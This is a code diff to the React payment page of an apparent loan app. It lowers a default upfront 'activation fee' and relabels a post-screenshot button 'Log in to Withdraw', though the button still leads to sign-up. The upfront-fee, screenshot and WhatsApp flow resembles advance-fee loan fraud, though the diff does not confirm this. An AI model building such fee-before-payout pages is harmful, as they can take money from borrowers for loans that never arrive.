@@ -19,6 +19,7 @@ import {
   RefreshCw,
   MessageCircle,
   UserPlus,
+  LogIn,
   Settings,
   Save,
   Eye,
@@ -95,7 +96,7 @@ export default function PaymentPage() {
   }) || {};
 
   const loanAmount = stateData.amount || savedApp?.amount || 'UGX 2,500,000';
-  const activationFee = stateData.activationFee || savedApp?.activationFee || 'UGX 100,000';
+  const activationFee = stateData.activationFee || savedApp?.activationFee || 'UGX 50,000';
   const applicantPhone = stateData.phone || savedApp?.phone || savedSession?.phone || '0785123456';
   const applicantName = stateData.firstName
     ? `${stateData.firstName} ${stateData.lastName || ''}`.trim()
@@ -355,14 +356,14 @@ export default function PaymentPage() {
                   <span>Contact Us on WhatsApp ({settings.whatsappNumber})</span>
                 </a>
 
-                {/* Sign up button visible after submitting screenshot for withdrawals, just below contact us button */}
+                {/* Log in to Withdraw button visible after submitting screenshot for withdrawals */}
                 <button
-                  id="post-withdrawal-signup-btn"
+                  id="post-withdrawal-login-btn"
                   onClick={() => navigate('/signup')}
                   className="w-full mt-2.5 py-3.5 px-4 rounded-xl bg-white hover:bg-gray-50 border-2 border-gray-300 text-gray-900 font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-xs transition cursor-pointer"
                 >
-                  <UserPlus className="w-5 h-5 text-[#ffcc00]" />
-                  <span>Sign Up</span>
+                  <LogIn className="w-5 h-5 text-[#ffcc00]" />
+                  <span>Log in to Withdraw</span>
                 </button>
               </div>
 
